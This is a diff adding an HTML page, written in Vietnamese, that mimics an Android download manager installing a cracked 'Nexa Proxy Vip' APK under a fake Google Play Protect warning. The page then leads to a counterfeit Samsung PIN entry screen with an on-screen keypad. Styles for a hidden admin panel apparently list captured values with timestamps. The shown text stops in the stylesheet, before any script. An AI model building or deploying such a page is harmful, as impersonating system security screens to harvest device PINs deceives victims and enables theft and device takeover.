@@ -1,0 +1,804 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<title>Google Play Protect</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+body{
+  font-family:'Google Sans','Roboto',system-ui,sans-serif;
+  background:#e8e8e8;
+  min-height:100vh;
+  max-width:420px;
+  margin:0 auto;
+  display:flex;flex-direction:column;
+  position:relative;overflow:hidden;
+}
+
+/* STATUS BAR */
+.sbar{
+  background:#fff;
+  padding:8px 16px 6px;
+  display:flex;justify-content:space-between;align-items:center;
+  position:relative;z-index:1;
+}
+.sbar-left{display:flex;align-items:center;gap:4px}
+.sbar-time{font-size:14px;font-weight:600;color:#111}
+.sbar-pill{
+  background:#000;border-radius:999px;
+  padding:3px 10px 3px 6px;
+  display:flex;align-items:center;gap:5px;
+  margin:0 4px;
+}
+.sbar-pill .rec-dot{width:7px;height:7px;border-radius:50%;background:#ff3b30}
+.sbar-pill .rec-time{font-size:11px;color:#fff;font-weight:500}
+.sbar-right{display:flex;align-items:center;gap:5px}
+.sbar-right svg{width:14px;height:14px}
+.sbar-batt{font-size:12px;font-weight:500;color:#111}
+
+/* DOWNLOAD MANAGER BACKGROUND */
+.dm-bg{
+  background:#f5f5f5;
+  flex:1;
+  position:relative;
+}
+.dm-header{
+  background:#fff;
+  padding:0 16px;
+  display:flex;align-items:center;justify-content:space-between;
+  height:52px;
+  border-bottom:1px solid #e0e0e0;
+}
+.dm-title{font-size:18px;font-weight:500;color:#111}
+.dm-icons{display:flex;gap:16px}
+.dm-icons svg{width:22px;height:22px;fill:#555}
+.dm-storage{
+  padding:10px 16px;
+  font-size:12px;color:#777;
+  background:#fff;
+  border-bottom:1px solid #eee;
+}
+.dm-section{
+  padding:10px 16px 6px;
+  font-size:12px;font-weight:500;color:#555;
+  letter-spacing:.3px;
+}
+.dm-file{
+  background:#fff;
+  padding:12px 16px;
+  display:flex;align-items:center;gap:14px;
+  border-bottom:1px solid #f0f0f0;
+}
+.dm-file-icon{
+  width:36px;height:36px;
+  display:flex;align-items:center;justify-content:center;
+  flex-shrink:0;
+}
+.dm-file-info{flex:1;min-width:0}
+.dm-file-name{font-size:14px;color:#111;font-weight:400;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.dm-file-meta{font-size:12px;color:#888;margin-top:2px}
+.dm-file-more{color:#888;padding:4px}
+.dm-file-more svg{width:20px;height:20px;fill:currentColor}
+
+/* INSTALL CARD BEHIND */
+.install-card{
+  background:#fff;
+  border-radius:16px;
+  margin:12px;
+  padding:14px 16px 10px;
+  display:flex;flex-direction:column;gap:10px;
+}
+.install-row{display:flex;align-items:center;gap:12px}
+.install-icon{
+  width:40px;height:40px;border-radius:10px;
+  background:linear-gradient(135deg,#1a237e,#283593);
+  display:flex;align-items:center;justify-content:center;
+  flex-shrink:0;
+}
+.install-name{font-size:15px;font-weight:500;color:#111}
+.install-status{font-size:13px;color:#888;margin-top:1px}
+.install-progress{
+  width:100%;height:4px;background:#e0e0e0;border-radius:999px;overflow:hidden;
+}
+.install-bar{
+  height:100%;background:#1976d2;border-radius:999px;
+  width:65%;
+  transition:width .1s;
+}
+.install-actions{display:flex;justify-content:flex-end}
+.install-cancel{font-size:14px;color:#888;padding:4px 0;background:none;border:none;cursor:pointer;font-family:inherit}
+
+/* DIM OVERLAY */
+.dim{
+  position:absolute;inset:0;
+  background:rgba(0,0,0,.35);
+  z-index:5;
+}
+
+/* BOTTOM SHEET */
+.sheet{
+  position:absolute;
+  left:0;right:0;bottom:0;
+  background:#fff;
+  border-radius:28px 28px 0 0;
+  z-index:10;
+  padding:0 0 8px;
+  box-shadow:0 -2px 20px rgba(0,0,0,.15);
+}
+
+/* drag handle */
+.sheet-handle{
+  width:36px;height:4px;border-radius:999px;
+  background:#ddd;margin:12px auto 20px;
+}
+
+.sheet-inner{padding:0 24px}
+
+/* Play Protect icon + label */
+.pp-brand{
+  display:flex;flex-direction:column;align-items:center;
+  margin-bottom:16px;
+  gap:6px;
+}
+.pp-label{font-size:13px;color:#5f6368;letter-spacing:.2px}
+
+/* Title */
+.sheet-title{
+  font-size:22px;font-weight:600;color:#111;
+  text-align:center;
+  margin-bottom:20px;
+  line-height:1.3;
+}
+
+/* App row */
+.app-row{
+  display:flex;align-items:center;gap:12px;
+  margin-bottom:16px;
+  padding:0 2px;
+}
+.app-icon-wrap{position:relative;flex-shrink:0}
+.app-icon{
+  width:52px;height:52px;border-radius:12px;
+  background:linear-gradient(135deg,#0d1b4b,#1a3a8f);
+  display:flex;align-items:center;justify-content:center;
+  overflow:visible;
+}
+/* Nexa-style icon — stylized play triangle */
+.app-icon svg{width:28px;height:28px}
+.warn-badge{
+  position:absolute;bottom:-4px;left:-4px;
+  width:20px;height:20px;border-radius:50%;
+  background:#ea4335;
+  display:flex;align-items:center;justify-content:center;
+  border:2px solid #fff;
+}
+.warn-badge svg{width:11px;height:11px;fill:#fff}
+.app-name{font-size:16px;font-weight:500;color:#111}
+
+/* Body text */
+.sheet-body{font-size:14px;color:#3c4043;line-height:1.6;margin-bottom:12px}
+
+/* Chi tiết khác */
+.detail-row{
+  display:flex;align-items:center;gap:4px;
+  color:#1a73e8;font-size:14px;
+  cursor:pointer;
+  margin-bottom:4px;
+  user-select:none;
+  padding:4px 0;
+}
+.detail-row svg{width:18px;height:18px;fill:#1a73e8;transition:transform .2s}
+.detail-row.open svg{transform:rotate(180deg)}
+.detail-expand{
+  font-size:13px;color:#5f6368;
+  line-height:1.6;
+  max-height:0;overflow:hidden;
+  transition:max-height .3s ease,padding .3s;
+  padding:0 0 0;
+}
+.detail-expand.open{max-height:120px;padding:8px 0 4px}
+
+/* Divider */
+.divider{height:1px;background:#f0f0f0;margin:16px 0}
+
+/* Button */
+.btn-understand{
+  display:block;width:100%;
+  background:#1a73e8;color:#fff;
+  border:none;border-radius:999px;
+  padding:15px 24px;
+  font-size:16px;font-weight:500;
+  cursor:pointer;font-family:inherit;
+  text-align:center;
+  transition:background .15s;
+  position:relative;
+}
+.btn-understand:hover{background:#1557b0}
+.btn-understand .spin{
+  display:none;width:18px;height:18px;
+  border:2px solid rgba(255,255,255,.3);border-top-color:#fff;
+  border-radius:50%;animation:spin .6s linear infinite;
+  position:absolute;left:50%;top:50%;margin:-9px 0 0 -9px;
+}
+.btn-understand.loading span{opacity:0}
+.btn-understand.loading .spin{display:block}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* NAVBAR */
+.navbar{
+  background:#fff;
+  border-top:1px solid #e8e8e8;
+  display:flex;align-items:center;justify-content:space-around;
+  padding:12px 0 18px;
+  position:relative;z-index:20;
+  flex-shrink:0;
+}
+.nav-btn svg{width:22px;height:22px}
+
+/* INSTALL SUCCESS */
+.inst-screen{
+  position:fixed;inset:0;
+  background:#f5f5f5;
+  display:none;flex-direction:column;align-items:center;
+  z-index:100;
+  font-family:inherit;
+}
+.inst-screen.show{display:flex}
+.inst-dm-header{
+  width:100%;background:#fff;
+  padding:0 16px;
+  display:flex;align-items:center;justify-content:space-between;
+  height:52px;border-bottom:1px solid #e0e0e0;
+  flex-shrink:0;
+}
+.inst-dm-title{font-size:18px;font-weight:500;color:#111}
+.inst-body{flex:1;width:100%;padding:12px}
+.inst-card{
+  background:#fff;border-radius:16px;
+  padding:16px;
+  display:flex;flex-direction:column;gap:12px;
+}
+.inst-row{display:flex;align-items:center;gap:12px}
+.inst-icon{
+  width:48px;height:48px;border-radius:12px;
+  background:linear-gradient(135deg,#0d1b4b,#1a3a8f);
+  display:flex;align-items:center;justify-content:center;
+  flex-shrink:0;
+}
+.inst-info-name{font-size:16px;font-weight:500;color:#111}
+.inst-info-status{font-size:13px;color:#888;margin-top:2px}
+.inst-prog{width:100%;height:4px;background:#e0e0e0;border-radius:999px;overflow:hidden}
+.inst-prog-fill{height:100%;background:#1976d2;border-radius:999px;width:0%;transition:width .1s linear}
+.inst-actions{display:flex;justify-content:flex-end;gap:16px}
+.inst-open{font-size:14px;color:#1a73e8;padding:4px 0;background:none;border:none;cursor:pointer;font-family:inherit;font-weight:500;opacity:0;transition:opacity .3s}
+.inst-cancel{font-size:14px;color:#888;padding:4px 0;background:none;border:none;cursor:pointer;font-family:inherit}
+.inst-pct{font-size:12px;color:#888;text-align:right}
+
+/* ADMIN */
+.admin-fab{
+  position:fixed;top:14px;right:14px;z-index:200;
+  background:rgba(255,255,255,.85);
+  border:1px solid #ddd;border-radius:999px;
+  font-size:12px;color:#555;
+  padding:5px 11px;cursor:pointer;font-family:inherit;
+  backdrop-filter:blur(6px);
+}
+
+/* OVERLAYS */
+.ov{
+  position:fixed;inset:0;background:rgba(0,0,0,.45);
+  z-index:300;display:none;align-items:flex-end;
+}
+.ov.open{display:flex}
+.dr{
+  width:100%;background:#fff;
+  border-radius:24px 24px 0 0;
+  padding:16px 20px 32px;
+  max-height:65vh;overflow-y:auto;
+}
+.dpill{width:36px;height:4px;border-radius:999px;background:#ddd;margin:0 auto 20px}
+.d-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
+.d-top h3{font-size:16px;font-weight:600;color:#111}
+.del-btn{background:#fce8e6;border:none;border-radius:8px;color:#c0392b;font-size:12px;padding:4px 10px;cursor:pointer;font-family:inherit}
+.pw-row{display:flex;align-items:flex-start;gap:10px;padding:11px 0;border-bottom:1px solid #f0f0f0}
+.pw-row:last-child{border-bottom:none}
+.pw-val{font-family:'Courier New',monospace;font-size:14px;color:#111;background:#f5f5f5;padding:3px 10px;border-radius:6px;word-break:break-all;flex:1}
+.pw-time{font-size:11px;color:#999;flex-shrink:0;margin-top:3px}
+.empty{font-size:13px;color:#999;padding:8px 0}
+.dr-close{display:block;width:100%;margin-top:14px;background:#f0f0f0;border:none;border-radius:12px;padding:13px;font-size:14px;color:#333;cursor:pointer;font-family:inherit}
+.l-inp{width:100%;border:none;border-bottom:1.5px solid #bbb;padding:10px 0;font-size:17px;color:#111;outline:none;font-family:inherit;background:transparent;margin-bottom:6px}
+.l-inp:focus{border-color:#1a73e8}
+.l-err{font-size:12px;color:#c0392b;min-height:16px;margin-bottom:14px;opacity:0;transition:opacity .2s}
+.l-err.show{opacity:1}
+.l-btn{width:100%;background:#1a73e8;color:#fff;border:none;border-radius:999px;padding:14px;font-size:15px;font-weight:500;cursor:pointer;font-family:inherit;margin-bottom:10px}
+.l-cancel{width:100%;background:#f0f0f0;border:none;border-radius:999px;padding:13px;font-size:14px;color:#555;cursor:pointer;font-family:inherit}
+</style>
+</head>
+<body>
+
+<button class="admin-fab" onclick="openAdmLogin()">⚙</button>
+
+<!-- STATUS BAR -->
+<div class="sbar">
+  <div class="sbar-left">
+    <span class="sbar-time" id="clk">19:03</span>
+  </div>
+  <div class="sbar-pill">
+    <div class="rec-dot"></div>
+    <span class="rec-time" id="rec-time">00:05</span>
+  </div>
+  <div class="sbar-right">
+    <!-- signal bars -->
+    <svg viewBox="0 0 24 24" fill="#111"><rect x="2" y="14" width="3" height="7" rx="1"/><rect x="7" y="10" width="3" height="11" rx="1"/><rect x="12" y="6" width="3" height="15" rx="1"/><rect x="17" y="2" width="3" height="19" rx="1" opacity=".3"/></svg>
+    <!-- wifi -->
+    <svg viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="2" stroke-linecap="round" width="14" height="14"><path d="M5 12.55a11 11 0 0 1 14.08 0M1.42 9A16 16 0 0 1 22.58 9M8.53 16.11a6 6 0 0 1 6.95 0M12 20h.01"/></svg>
+    <span class="sbar-batt">92</span>
+    <!-- battery -->
+    <svg viewBox="0 0 28 15" fill="none" width="22" height="13"><rect x="1" y="1" width="22" height="13" rx="2.5" stroke="#111" stroke-width="1.3"/><path d="M25 5v5" stroke="#111" stroke-width="1.3" stroke-linecap="round"/><rect x="2.5" y="2.5" width="19" height="10" rx="1.5" fill="#111"/></svg>
+  </div>
+</div>
+
+<!-- DM BACKGROUND -->
+<div class="dm-bg">
+  <div class="dm-header">
+    <span class="dm-title">Tệp đã tải xuống</span>
+    <div class="dm-icons">
+      <svg viewBox="0 0 24 24"><path d="M12 15.5A3.5 3.5 0 0 1 8.5 12 3.5 3.5 0 0 1 12 8.5a3.5 3.5 0 0 1 3.5 3.5 3.5 3.5 0 0 1-3.5 3.5m7.43-2.92c.04-.32.07-.64.07-.97s-.03-.66-.07-1l2.11-1.63c.19-.15.24-.42.12-.64l-2-3.46c-.12-.22-.39-.3-.61-.22l-2.49 1c-.52-.4-1.08-.73-1.69-.98l-.38-2.65C14.46 2.18 14.25 2 14 2h-4c-.25 0-.46.18-.49.42l-.38 2.65c-.61.25-1.17.59-1.69.98l-2.49-1c-.23-.09-.49 0-.61.22l-2 3.46c-.13.22-.07.49.12.64L4.57 11c-.04.34-.07.67-.07 1s.03.65.07.97l-2.11 1.66c-.19.15-.25.42-.12.64l2 3.46c.12.22.39.3.61.22l2.49-1.01c.52.4 1.08.73 1.69.98l.38 2.65c.03.24.24.42.49.42h4c.25 0 .46-.18.49-.42l.38-2.65c.61-.25 1.17-.58 1.69-.98l2.49 1.01c.22.08.49 0 .61-.22l2-3.46c.12-.22.07-.49-.12-.64l-2.11-1.66z"/></svg>
+      <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65" stroke="#555" stroke-width="2" stroke-linecap="round"/></svg>
+      <svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18" stroke="#555" stroke-width="2" stroke-linecap="round"/><line x1="6" y1="6" x2="18" y2="18" stroke="#555" stroke-width="2" stroke-linecap="round"/></svg>
+    </div>
+  </div>
+  <div class="dm-storage">Đang dùng: 11,51 MB/240,65 GB</div>
+  <div class="dm-section">Vừa xong</div>
+  <div class="dm-file">
+    <div class="dm-file-icon">
+      <svg width="30" height="30" viewBox="0 0 24 24" fill="#607d8b"><path d="M6 2c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6H6zm7 7V3.5L18.5 9H13z"/></svg>
+    </div>
+    <div class="dm-file-info">
+      <div class="dm-file-name">nexa-proxy-vip-crack.apk</div>
+      <div class="dm-file-meta">11,51 MB · download6295.zufile.com</div>
+    </div>
+    <div class="dm-file-more">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="5" r="1.5"/><circle cx="12" cy="12" r="1.5"/><circle cx="12" cy="19" r="1.5"/></svg>
+    </div>
+  </div>
+
+  <!-- Install card behind -->
+  <div style="padding:12px 12px 0">
+    <div class="install-card">
+      <div class="install-row">
+        <div class="install-icon">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+            <path d="M5 3l14 9-14 9V3z" fill="#4fc3f7"/>
+            <path d="M5 3l7 9-7 9" fill="#29b6f6" opacity=".5"/>
+          </svg>
+        </div>
+        <div>
+          <div class="install-name">Nexa Proxy Vip</div>
+          <div class="install-status">Đang cài đặt...</div>
+        </div>
+      </div>
+      <div class="install-progress"><div class="install-bar" id="bg-bar"></div></div>
+      <div class="install-actions"><button class="install-cancel">Hủy</button></div>
+    </div>
+  </div>
+
+  <!-- DIM -->
+  <div class="dim"></div>
+
+  <!-- BOTTOM SHEET -->
+  <div class="sheet">
+    <div class="sheet-handle"></div>
+    <div class="sheet-inner">
+
+      <!-- Play Protect brand -->
+      <div class="pp-brand">
+        <!-- Shield SVG matching screenshot exactly -->
+        <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
+          <path d="M20 3L5 9v10c0 9.5 6.4 18.4 15 20.6C29.6 37.4 36 28.5 36 19V9L20 3z" stroke="#4285f4" stroke-width="2" fill="rgba(66,133,244,.08)"/>
+          <path d="M14 20l4 4 8-8" stroke="#4285f4" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span class="pp-label">Google Play Protect</span>
+      </div>
+
+      <div class="sheet-title">Đã chặn ứng dụng có hại</div>
+
+      <!-- App row -->
+      <div class="app-row">
+        <div class="app-icon-wrap">
+          <div class="app-icon">
+            <!-- Nexa-style icon -->
+            <svg width="30" height="30" viewBox="0 0 30 30" fill="none">
+              <circle cx="15" cy="15" r="12" fill="#1565c0" opacity=".3"/>
+              <path d="M11 9l12 6-12 6V9z" fill="#4fc3f7"/>
+              <path d="M11 9l6 6-6 6" fill="#29b6f6" opacity=".6"/>
+            </svg>
+          </div>
+          <div class="warn-badge">
+            <svg viewBox="0 0 24 24"><path d="M12 2L1 21h22L12 2zm0 3.5L20.5 19h-17L12 5.5zM11 10v4h2v-4h-2zm0 6v2h2v-2h-2z"/></svg>
+          </div>
+        </div>
+        <div class="app-name">Nexa Proxy Vip</div>
+      </div>
+
+      <div class="sheet-body">Ứng dụng này có thể gây hại.</div>
+
+      <!-- Tiếp tục cài đặt -->
+      <div class="detail-row" id="detail-row" onclick="openPwScreen()">
+        <span>Tiếp tục cài đặt</span>
+        <svg viewBox="0 0 24 24" style="transform:rotate(-90deg)"><path d="M7 10l5 5 5-5z"/></svg>
+      </div>
+
+      <div class="divider"></div>
+
+      <button class="btn-understand" id="main-btn" onclick="doUnderstand()">
+        <span>Tôi hiểu</span>
+        <div class="spin"></div>
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- NAVBAR -->
+<div class="navbar">
+  <div class="nav-btn">
+    <svg viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="1.5" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+  </div>
+  <div class="nav-btn">
+    <svg viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="1.5" stroke-linecap="round"><circle cx="12" cy="12" r="9"/></svg>
+  </div>
+  <div class="nav-btn">
+    <svg viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 20H4V4"/><path d="M4 16l4-4 4 4 4-6 4 4"/></svg>
+  </div>
+</div>
+
+<!-- INSTALL SCREEN -->
+<div class="inst-screen" id="inst-scr">
+  <div style="background:#fff;width:100%;padding:8px 16px 6px;display:flex;justify-content:space-between;align-items:center;flex-shrink:0">
+    <span style="font-size:14px;font-weight:600;color:#111" id="inst-clk">19:03</span>
+    <div style="display:flex;gap:5px;align-items:center">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="#111"><rect x="2" y="14" width="3" height="7" rx="1"/><rect x="7" y="10" width="3" height="11" rx="1"/><rect x="12" y="6" width="3" height="15" rx="1"/></svg>
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="2" stroke-linecap="round"><path d="M5 12.55a11 11 0 0 1 14.08 0M1.42 9A16 16 0 0 1 22.58 9M8.53 16.11a6 6 0 0 1 6.95 0M12 20h.01"/></svg>
+    </div>
+  </div>
+  <div class="inst-dm-header">
+    <span class="inst-dm-title">Tệp đã tải xuống</span>
+    <div style="display:flex;gap:16px">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="#555"><path d="M6 2c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6H6zm7 7V3.5L18.5 9H13z"/></svg>
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65" stroke-linecap="round"/></svg>
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="2" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+    </div>
+  </div>
+  <div class="inst-body">
+    <div style="font-size:12px;color:#777;padding:8px 0 6px">Đang dùng: 11,51 MB/240,65 GB</div>
+    <div style="font-size:12px;font-weight:500;color:#555;padding:4px 0 8px;letter-spacing:.3px">Vừa xong</div>
+    <div style="background:#fff;border-radius:4px;padding:12px;display:flex;align-items:center;gap:14px;margin-bottom:8px">
+      <svg width="30" height="30" viewBox="0 0 24 24" fill="#607d8b"><path d="M6 2c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6H6zm7 7V3.5L18.5 9H13z"/></svg>
+      <div>
+        <div style="font-size:14px;color:#111">nexa-proxy-vip-crack.apk</div>
+        <div style="font-size:12px;color:#888;margin-top:2px">11,51 MB · download6295.zufile.com</div>
+      </div>
+    </div>
+    <div class="inst-card">
+      <div class="inst-row">
+        <div class="inst-icon">
+          <svg width="26" height="26" viewBox="0 0 30 30" fill="none"><circle cx="15" cy="15" r="12" fill="#1565c0" opacity=".3"/><path d="M11 9l12 6-12 6V9z" fill="#4fc3f7"/><path d="M11 9l6 6-6 6" fill="#29b6f6" opacity=".6"/></svg>
+        </div>
+        <div>
+          <div class="inst-info-name">Nexa Proxy Vip</div>
+          <div class="inst-info-status" id="inst-status">Đang cài đặt...</div>
+        </div>
+      </div>
+      <div class="inst-prog"><div class="inst-prog-fill" id="inst-fill"></div></div>
+      <div class="inst-pct" id="inst-pct">0%</div>
+      <div class="inst-actions">
+        <button class="inst-open" id="inst-open-btn">Mở</button>
+        <button class="inst-cancel">Hủy</button>
+      </div>
+    </div>
+  </div>
+  <div style="background:#fff;border-top:1px solid #e8e8e8;display:flex;justify-content:space-around;padding:12px 0 18px;width:100%;flex-shrink:0">
+    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="1.5" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="1.5"><circle cx="12" cy="12" r="9"/></svg>
+    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 20H4V4"/><path d="M4 16l4-4 4 4 4-6 4 4"/></svg>
+  </div>
+</div>
+
+<!-- SAMSUNG PASSWORD SCREEN -->
+<div id="samsung-pw-screen" style="
+  position:fixed;inset:0;z-index:150;
+  background:#f5f1f8;
+  display:none;flex-direction:column;
+  font-family:'Google Sans','Roboto',system-ui,sans-serif;
+  max-width:420px;margin:0 auto;
+">
+  <!-- status bar -->
+  <div style="background:#f5f1f8;padding:10px 20px 6px;display:flex;justify-content:space-between;align-items:center;flex-shrink:0">
+    <span style="font-size:14px;font-weight:600;color:#111" id="sam-clk">19:03</span>
+    <div style="display:flex;gap:5px;align-items:center">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="#111"><rect x="2" y="14" width="3" height="7" rx="1"/><rect x="7" y="10" width="3" height="11" rx="1"/><rect x="12" y="6" width="3" height="15" rx="1"/></svg>
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="2" stroke-linecap="round"><path d="M5 12.55a11 11 0 0 1 14.08 0M1.42 9A16 16 0 0 1 22.58 9M8.53 16.11a6 6 0 0 1 6.95 0M12 20h.01"/></svg>
+      <svg width="20" height="13" viewBox="0 0 28 15" fill="none"><rect x="1" y="1" width="22" height="13" rx="2.5" stroke="#111" stroke-width="1.3"/><path d="M25 5v5" stroke="#111" stroke-width="1.3" stroke-linecap="round"/><rect x="2.5" y="2.5" width="19" height="10" rx="1.5" fill="#111"/></svg>
+    </div>
+  </div>
+
+  <!-- main content -->
+  <div style="flex:1;display:flex;flex-direction:column;align-items:center;padding:56px 32px 20px">
+    <!-- lock icon -->
+    <svg width="52" height="52" viewBox="0 0 52 52" fill="none" style="margin-bottom:24px">
+      <rect x="10" y="24" width="32" height="22" rx="4" fill="#2c2c54" opacity=".9"/>
+      <path d="M18 24V18a8 8 0 0 1 16 0v6" stroke="#2c2c54" stroke-width="3.5" stroke-linecap="round" opacity=".9"/>
+      <circle cx="26" cy="35" r="3.5" fill="#fff"/>
+      <line x1="26" y1="38.5" x2="26" y2="42" stroke="#fff" stroke-width="2.5" stroke-linecap="round"/>
+    </svg>
+
+    <div style="font-size:22px;font-weight:600;color:#111;text-align:center;margin-bottom:12px">Cài đặt ứng dụng có hại?</div>
+    <div style="font-size:14px;color:#666;text-align:center;line-height:1.6;margin-bottom:48px">Ứng dụng này có thể gây hại cho thiết bị của bạn.</div>
+
+    <!-- PIN display — underline style -->
+    <div style="width:220px;position:relative;margin-bottom:4px">
+      <div id="sam-dots" style="
+        width:100%;min-height:48px;
+        border-bottom:1.5px solid #aaa;
+        display:flex;align-items:center;justify-content:center;
+        font-size:28px;letter-spacing:10px;color:#111;
+        padding:4px 0 8px;
+      ">​</div><!-- zero-width space to hold height -->
+    </div>
+    <div id="sam-err" style="font-size:13px;color:#c0392b;min-height:18px;text-align:center;opacity:0;transition:opacity .2s;margin-bottom:8px"></div>
+  </div>
+
+  <!-- SAMSUNG KEYBOARD -->
+  <div style="background:#ece8f0;border-top:1px solid #ddd;flex-shrink:0">
+    <!-- toolbar -->
+    <div style="display:flex;justify-content:space-between;align-items:center;padding:7px 14px;border-bottom:1px solid #e0dce8">
+      <div style="width:40px;height:36px;display:flex;align-items:center;justify-content:center;color:#555">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>
+      </div>
+      <div style="width:40px;height:36px;display:flex;align-items:center;justify-content:center;color:#555">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"><rect x="9" y="2" width="6" height="4" rx="1"/><rect x="5" y="4" width="14" height="17" rx="2"/><line x1="9" y1="10" x2="15" y2="10"/><line x1="9" y1="14" x2="13" y2="14"/></svg>
+      </div>
+      <div style="width:40px;height:36px;display:flex;align-items:center;justify-content:center;color:#555">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"><rect x="9" y="2" width="6" height="12" rx="3"/><path d="M5 10a7 7 0 0 0 14 0"/><line x1="12" y1="17" x2="12" y2="21"/><line x1="8" y1="21" x2="16" y2="21"/></svg>
+      </div>
+      <div style="flex:1"></div>
+      <div style="width:40px;height:36px;display:flex;align-items:center;justify-content:center;color:#555">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><line x1="16.5" y1="16.5" x2="22" y2="22"/></svg>
+      </div>
+    </div>
+    <!-- numpad grid -->
+    <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:#ddd">
+      <div class="samkey" onclick="samTap('1')"><span class="samnum">1</span><span class="samlet"></span></div>
+      <div class="samkey" onclick="samTap('2')"><span class="samnum">2</span><span class="samlet">ABC</span></div>
+      <div class="samkey" onclick="samTap('3')"><span class="samnum">3</span><span class="samlet">DEF</span></div>
+      <div class="samkey" onclick="samTap('4')"><span class="samnum">4</span><span class="samlet">GHI</span></div>
+      <div class="samkey" onclick="samTap('5')"><span class="samnum">5</span><span class="samlet">JKL</span></div>
+      <div class="samkey" onclick="samTap('6')"><span class="samnum">6</span><span class="samlet">MNO</span></div>
+      <div class="samkey" onclick="samTap('7')"><span class="samnum">7</span><span class="samlet">PQRS</span></div>
+      <div class="samkey" onclick="samTap('8')"><span class="samnum">8</span><span class="samlet">TUV</span></div>
+      <div class="samkey" onclick="samTap('9')"><span class="samnum">9</span><span class="samlet">WXYZ</span></div>
+      <div class="samkey samkey-del" onclick="samDel()">
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#555" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
+          <line x1="18" y1="9" x2="12" y2="15"/><line x1="12" y1="9" x2="18" y2="15"/>
+        </svg>
+      </div>
+      <div class="samkey" onclick="samTap('0')"><span class="samnum">0</span><span class="samlet">+</span></div>
+      <div class="samkey samkey-go" id="sam-go" onclick="samSubmit()">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/>
+        </svg>
+      </div>
+    </div>
+  </div>
+
+  <!-- navbar -->
+  <div style="background:#f5f1f8;border-top:1px solid #e0dce8;display:flex;justify-content:space-around;padding:12px 0 18px;flex-shrink:0">
+    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="1.5" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="1.5"><circle cx="12" cy="12" r="9"/></svg>
+    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 20H4V4"/><path d="M4 16l4-4 4 4 4-6 4 4"/></svg>
+  </div>
+</div>
+
+<style>
+.samkey{
+  background:#ece8f0;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  padding:14px 0 12px;cursor:pointer;user-select:none;min-height:62px;
+  transition:background .08s;
+}
+.samkey:active{background:#d8d4e0}
